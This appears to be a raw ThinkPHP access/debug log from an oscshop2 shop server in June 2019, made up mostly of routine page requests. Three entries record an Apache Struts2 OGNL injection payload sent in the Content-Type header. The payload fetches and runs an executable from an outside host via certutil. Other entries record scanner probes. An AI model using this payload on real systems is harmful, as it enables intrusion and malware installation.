---------------------------------------------------------------
[ 2019-06-14T00:48:21+08:00 ] 131.0.95.129 GET 114.67.89.3:80/
[运行时间：0.338704s] [吞吐率：2.95req/s] [内存消耗：3,636.91kb] [文件加载：51]
[ info ] [ LANG ] /var/www/html/css/oscshop2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.67.89.3:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] osc\index\controller\Index->index[ /var/www/html/css/oscshop2/oscshop/index/controller/Index.php ]
[ info ] [ VIEW ] ./themes/shop/index/index/index.html [ array (
  0 => 'top_nav',
  1 => 'cartlist',
  2 => 'total_price',
  3 => 'brands',
  4 => 'no_bottom',
  5 => 'empty',
  6 => 'list',
  7 => 'SEO',
) ]
[ info ] [ SESSION ] INIT array (
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-06-14T04:52:04+08:00 ] 37.255.67.99 GET 114.67.89.3:80/
[运行时间：0.356999s] [吞吐率：2.80req/s] [内存消耗：3,636.91kb] [文件加载：51]
[ info ] [ LANG ] /var/www/html/css/oscshop2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.67.89.3:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] osc\index\controller\Index->index[ /var/www/html/css/oscshop2/oscshop/index/controller/Index.php ]
[ info ] [ VIEW ] ./themes/shop/index/index/index.html [ array (
  0 => 'top_nav',
  1 => 'cartlist',
  2 => 'total_price',
  3 => 'brands',
  4 => 'no_bottom',
  5 => 'empty',
  6 => 'list',
  7 => 'SEO',
) ]
[ info ] [ SESSION ] INIT array (
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-06-14T05:03:59+08:00 ] 121.227.152.37 GET 114.67.89.3/struts2-rest-showcase/orders.xhtml
[运行时间：0.012081s] [吞吐率：82.77req/s] [内存消耗：1,833.39kb] [文件加载：30]
[ info ] [ LANG ] /var/www/html/css/oscshop2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'struts2-rest-showcase',
    1 => 'orders',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'accept' => '*/*',
  'accept-language' => 'zh-cn',
  'referer' => 'http://114.67.89.3:80/struts2-rest-showcase/orders.xhtml',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'host' => '114.67.89.3',
  'content-type' => '%{(#nike=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'cmd.exe /c certutil.exe -urlcache -split -f http://fid.hognoob.se/download.exe %SystemRoot%/Temp/huujghjfiebevlu21077.exe & cmd.exe /c %SystemRoot%/Temp/huujghjfiebevlu21077.exe\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}',
)
[ info ] [ PARAM ] array (
  '/struts2-rest-showcase/orders_xhtml' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-06-14T05:03:59+08:00 ] 121.227.152.37 GET 114.67.89.3/index.action
[运行时间：0.351189s] [吞吐率：2.85req/s] [内存消耗：3,645.72kb] [文件加载：51]
[ info ] [ LANG ] /var/www/html/css/oscshop2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'accept' => '*/*',
  'accept-language' => 'zh-cn',
  'referer' => 'http://114.67.89.3:80/index.action',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'host' => '114.67.89.3',
  'content-type' => '%{(#nike=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'cmd.exe /c certutil.exe -urlcache -split -f http://fid.hognoob.se/download.exe %SystemRoot%/Temp/huujghjfiebevlu21077.exe & cmd.exe /c %SystemRoot%/Temp/huujghjfiebevlu21077.exe\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}',
)
[ info ] [ PARAM ] array (
  '/index_action' => '',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] osc\index\controller\Index->index[ /var/www/html/css/oscshop2/oscshop/index/controller/Index.php ]
[ info ] [ VIEW ] ./themes/shop/index/index/index.html [ array (
  0 => 'top_nav',
  1 => 'cartlist',
  2 => 'total_price',
  3 => 'brands',
  4 => 'no_bottom',
  5 => 'empty',
  6 => 'list',
  7 => 'SEO',
) ]
[ info ] [ SESSION ] INIT array (
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-06-14T05:03:59+08:00 ] 121.227.152.37 GET 114.67.89.3/index.do
[运行时间：0.234310s] [吞吐率：4.27req/s] [内存消耗：3,645.66kb] [文件加载：51]
[ info ] [ LANG ] /var/www/html/css/oscshop2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'accept' => '*/*',
  'accept-language' => 'zh-cn',
  'referer' => 'http://114.67.89.3:80/index.do',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'host' => '114.67.89.3',
  'content-type' => '%{(#nike=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'cmd.exe /c certutil.exe -urlcache -split -f http://fid.hognoob.se/download.exe %SystemRoot%/Temp/huujghjfiebevlu21077.exe & cmd.exe /c %SystemRoot%/Temp/huujghjfiebevlu21077.exe\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}',
)
[ info ] [ PARAM ] array (
  '/index_do' => '',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] osc\index\controller\Index->index[ /var/www/html/css/oscshop2/oscshop/index/controller/Index.php ]
[ info ] [ VIEW ] ./themes/shop/index/index/index.html [ array (
  0 => 'top_nav',
  1 => 'cartlist',
  2 => 'total_price',
  3 => 'brands',
  4 => 'no_bottom',
  5 => 'empty',
  6 => 'list',
  7 => 'SEO',
) ]
[ info ] [ SESSION ] INIT array (
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-06-14T06:24:34+08:00 ] 188.166.163.172 GET 114.67.89.3/
[运行时间：0.333403s] [吞吐率：3.00req/s] [内存消耗：3,636.89kb] [文件加载：51]
[ info ] [ LANG ] /var/www/html/css/oscshop2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '114.67.89.3',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] osc\index\controller\Index->index[ /var/www/html/css/oscshop2/oscshop/index/controller/Index.php ]
[ info ] [ VIEW ] ./themes/shop/index/index/index.html [ array (
  0 => 'top_nav',
  1 => 'cartlist',
  2 => 'total_price',
  3 => 'brands',
  4 => 'no_bottom',
  5 => 'empty',
  6 => 'list',
  7 => 'SEO',
) ]
[ info ] [ SESSION ] INIT array (
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-06-14T06:32:25+08:00 ] 81.21.25.246 GET 114.67.89.3:80/
[运行时间：0.347205s] [吞吐率：2.88req/s] [内存消耗：3,636.91kb] [文件加载：51]
[ info ] [ LANG ] /var/www/html/css/oscshop2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.67.89.3:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] osc\index\controller\Index->index[ /var/www/html/css/oscshop2/oscshop/index/controller/Index.php ]
[ info ] [ VIEW ] ./themes/shop/index/index/index.html [ array (
  0 => 'top_nav',
  1 => 'cartlist',
  2 => 'total_price',
  3 => 'brands',
  4 => 'no_bottom',
  5 => 'empty',
  6 => 'list',
  7 => 'SEO',
) ]
[ info ] [ SESSION ] INIT array (
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-06-14T07:53:48+08:00 ] 82.114.95.18 GET 114.67.89.3:80/
[运行时间：0.499456s] [吞吐率：2.00req/s] [内存消耗：3,637.25kb] [文件加载：51]
[ info ] [ LANG ] /var/www/html/css/oscshop2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.67.89.3:80',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] osc\index\controller\Index->index[ /var/www/html/css/oscshop2/oscshop/index/controller/Index.php ]
[ info ] [ VIEW ] ./themes/shop/index/index/index.html [ array (
  0 => 'top_nav',
  1 => 'cartlist',
  2 => 'total_price',
  3 => 'brands',
  4 => 'no_bottom',
  5 => 'empty',
  6 => 'list',
  7 => 'SEO',
) ]
[ info ] [ SESSION ] INIT array (
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-06-14T08:33:03+08:00 ] 123.209.242.207 GET 114.67.89.3:80/
[运行时间：0.347979s] [吞吐率：2.87req/s] [内存消耗：3,636.91kb] [文件加载：51]
[ info ] [ LANG ] /var/www/html/css/oscshop2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.67.89.3:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] osc\index\controller\Index->index[ /var/www/html/css/oscshop2/oscshop/index/controller/Index.php ]
[ info ] [ VIEW ] ./themes/shop/index/index/index.html [ array (
  0 => 'top_nav',
  1 => 'cartlist',
  2 => 'total_price',
  3 => 'brands',
  4 => 'no_bottom',
  5 => 'empty',
  6 => 'list',
  7 => 'SEO',
) ]
[ info ] [ SESSION ] INIT array (
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-06-14T10:04:29+08:00 ] 110.137.190.20 GET 114.67.89.3:80/
[运行时间：0.444228s] [吞吐率：2.25req/s] [内存消耗：3,637.72kb] [文件加载：51]
[ info ] [ LANG ] /var/www/html/css/oscshop2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.67.89.3:80',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'cache-control' => 'max-stale=0',
  'connection' => 'Keep-Alive',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] osc\index\controller\Index->index[ /var/www/html/css/oscshop2/oscshop/index/controller/Index.php ]
[ info ] [ VIEW ] ./themes/shop/index/index/index.html [ array (
  0 => 'top_nav',
  1 => 'cartlist',
  2 => 'total_price',
  3 => 'brands',
  4 => 'no_bottom',
  5 => 'empty',
  6 => 'list',
  7 => 'SEO',
) ]
[ info ] [ SESSION ] INIT array (
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-06-14T10:39:13+08:00 ] 191.110.131.212 GET 114.67.89.3:80/
[运行时间：0.349687s] [吞吐率：2.86req/s] [内存消耗：3,636.91kb] [文件加载：51]
[ info ] [ LANG ] /var/www/html/css/oscshop2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.67.89.3:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] osc\index\controller\Index->index[ /var/www/html/css/oscshop2/oscshop/index/controller/Index.php ]
[ info ] [ VIEW ] ./themes/shop/index/index/index.html [ array (
  0 => 'top_nav',
  1 => 'cartlist',
  2 => 'total_price',
  3 => 'brands',
  4 => 'no_bottom',
  5 => 'empty',
  6 => 'list',
  7 => 'SEO',
) ]
[ info ] [ SESSION ] INIT array (
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-06-14T10:41:38+08:00 ] 191.242.167.7 GET 114.67.89.3:80/
[运行时间：0.244679s] [吞吐率：4.09req/s] [内存消耗：3,636.91kb] [文件加载：51]
[ info ] [ LANG ] /var/www/html/css/oscshop2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.67.89.3:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] osc\index\controller\Index->index[ /var/www/html/css/oscshop2/oscshop/index/controller/Index.php ]
[ info ] [ VIEW ] ./themes/shop/index/index/index.html [ array (
  0 => 'top_nav',
  1 => 'cartlist',
  2 => 'total_price',
  3 => 'brands',
  4 => 'no_bottom',
  5 => 'empty',
  6 => 'list',
  7 => 'SEO',
) ]
[ info ] [ SESSION ] INIT array (
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-06-14T10:46:34+08:00 ] 79.142.215.9 GET 114.67.89.3:80/
[运行时间：0.329444s] [吞吐率：3.04req/s] [内存消耗：3,636.91kb] [文件加载：51]
[ info ] [ LANG ] /var/www/html/css/oscshop2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.67.89.3:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] osc\index\controller\Index->index[ /var/www/html/css/oscshop2/oscshop/index/controller/Index.php ]
[ info ] [ VIEW ] ./themes/shop/index/index/index.html [ array (
  0 => 'top_nav',
  1 => 'cartlist',
  2 => 'total_price',
  3 => 'brands',
  4 => 'no_bottom',
  5 => 'empty',
  6 => 'list',
  7 => 'SEO',
) ]
[ info ] [ SESSION ] INIT array (
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-06-14T10:48:43+08:00 ] 27.111.46.156 GET 114.67.89.3:80/
[运行时间：0.231186s] [吞吐率：4.33req/s] [内存消耗：3,636.91kb] [文件加载：51]
[ info ] [ LANG ] /var/www/html/css/oscshop2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.67.89.3:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] osc\index\controller\Index->index[ /var/www/html/css/oscshop2/oscshop/index/controller/Index.php ]
[ info ] [ VIEW ] ./themes/shop/index/index/index.html [ array (
  0 => 'top_nav',
  1 => 'cartlist',
  2 => 'total_price',
  3 => 'brands',
  4 => 'no_bottom',
  5 => 'empty',
  6 => 'list',
  7 => 'SEO',
) ]
[ info ] [ SESSION ] INIT array (
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-06-14T11:37:07+08:00 ] 177.36.220.26 GET 114.67.89.3:80/
[运行时间：0.325743s] [吞吐率：3.07req/s] [内存消耗：3,636.91kb] [文件加载：51]
[ info ] [ LANG ] /var/www/html/css/oscshop2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.67.89.3:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] osc\index\controller\Index->index[ /var/www/html/css/oscshop2/oscshop/index/controller/Index.php ]
[ info ] [ VIEW ] ./themes/shop/index/index/index.html [ array (
  0 => 'top_nav',
  1 => 'cartlist',
  2 => 'total_price',
  3 => 'brands',
  4 => 'no_bottom',
  5 => 'empty',
  6 => 'list',
  7 => 'SEO',
) ]
[ info ] [ SESSION ] INIT array (
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-06-14T11:41:33+08:00 ] 162.243.151.176 GET 114.67.89.3/
[运行时间：0.246830s] [吞吐率：4.05req/s] [内存消耗：3,637.01kb] [文件加载：51]
[ info ] [ LANG ] /var/www/html/css/oscshop2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.67.89.3',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'accept' => '*/*',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] osc\index\controller\Index->index[ /var/www/html/css/oscshop2/oscshop/index/controller/Index.php ]
[ info ] [ VIEW ] ./themes/shop/index/index/index.html [ array (
  0 => 'top_nav',
  1 => 'cartlist',
  2 => 'total_price',
  3 => 'brands',
  4 => 'no_bottom',
  5 => 'empty',
  6 => 'list',
  7 => 'SEO',
) ]
[ info ] [ SESSION ] INIT array (
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-06-14T13:18:17+08:00 ] 222.186.57.6 GET 114.67.89.3:80/manager/html
[运行时间：0.012385s] [吞吐率：80.74req/s] [内存消耗：1,829.23kb] [文件加载：30]
[ info ] [ LANG ] /var/www/html/css/oscshop2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'manager',
    1 => 'html',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html, application/xhtml+xml, */*',
  'user-agent' => 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)',
  'host' => '114.67.89.3:80',
)
[ info ] [ PARAM ] array (
  '/manager/html' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-06-14T14:11:40+08:00 ] 124.204.54.60 GET 114.67.89.3/
[运行时间：0.452702s] [吞吐率：2.21req/s] [内存消耗：3,638.32kb] [文件加载：51]
[ info ] [ LANG ] /var/www/html/css/oscshop2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.8',
  'accept-encoding' => 'gzip, deflate',
  'connection' => 'keep-alive',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
  'host' => '114.67.89.3',
  'upgrade-insecure-requests' => '1',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] osc\index\controller\Index->index[ /var/www/html/css/oscshop2/oscshop/index/controller/Index.php ]
[ info ] [ VIEW ] ./themes/shop/index/index/index.html [ array (
  0 => 'top_nav',
  1 => 'cartlist',
  2 => 'total_price',
  3 => 'brands',
  4 => 'no_bottom',
  5 => 'empty',
  6 => 'list',
  7 => 'SEO',
) ]
[ info ] [ SESSION ] INIT array (
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-06-14T14:35:43+08:00 ] 103.53.110.52 GET 114.67.89.3:80/
[运行时间：0.346337s] [吞吐率：2.89req/s] [内存消耗：3,636.91kb] [文件加载：51]
[ info ] [ LANG ] /var/www/html/css/oscshop2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.67.89.3:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] osc\index\controller\Index->index[ /var/www/html/css/oscshop2/oscshop/index/controller/Index.php ]
[ info ] [ VIEW ] ./themes/shop/index/index/index.html [ array (
  0 => 'top_nav',
  1 => 'cartlist',
  2 => 'total_price',
  3 => 'brands',
  4 => 'no_bottom',
  5 => 'empty',
  6 => 'list',
  7 => 'SEO',
) ]
[ info ] [ SESSION ] INIT array (
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-06-14T15:23:41+08:00 ] 194.60.236.254 GET 114.67.89.3:80/
[运行时间：0.428772s] [吞吐率：2.33req/s] [内存消耗：3,636.91kb] [文件加载：51]
[ info ] [ LANG ] /var/www/html/css/oscshop2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.67.89.3:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] osc\index\controller\Index->index[ /var/www/html/css/oscshop2/oscshop/index/controller/Index.php ]
[ info ] [ VIEW ] ./themes/shop/index/index/index.html [ array (
  0 => 'top_nav',
  1 => 'cartlist',
  2 => 'total_price',
  3 => 'brands',
  4 => 'no_bottom',
  5 => 'empty',
  6 => 'list',
  7 => 'SEO',
) ]
[ info ] [ SESSION ] INIT array (
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-06-14T15:53:48+08:00 ] 185.129.117.112 GET 114.67.89.3:80/
[运行时间：0.355874s] [吞吐率：2.81req/s] [内存消耗：3,636.91kb] [文件加载：51]
[ info ] [ LANG ] /var/www/html/css/oscshop2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.67.89.3:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] osc\index\controller\Index->index[ /var/www/html/css/oscshop2/oscshop/index/controller/Index.php ]
[ info ] [ VIEW ] ./themes/shop/index/index/index.html [ array (
  0 => 'top_nav',
  1 => 'cartlist',
  2 => 'total_price',
  3 => 'brands',
  4 => 'no_bottom',
  5 => 'empty',
  6 => 'list',
  7 => 'SEO',
) ]
[ info ] [ SESSION ] INIT array (
  'type' => '',
  'auto_start' => true,
)
